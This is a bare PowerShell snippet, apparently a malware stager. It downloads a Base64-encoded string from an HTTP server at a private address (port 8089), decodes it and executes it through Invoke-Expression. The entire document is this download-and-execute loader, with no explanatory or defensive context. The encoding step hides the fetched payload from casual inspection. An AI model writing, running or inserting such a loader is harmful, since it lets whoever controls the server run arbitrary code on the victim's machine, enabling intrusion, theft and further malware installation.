$wc2 = New-Object system.Net.WebClient;
$enc = $wc2.downloadString("http://192.168.1.8:8089/publish");
$b = [System.Convert]::FromBase64String($enc)
$b=[System.Text.Encoding]::UTF8.GetString($b)
Invoke-Expression $b
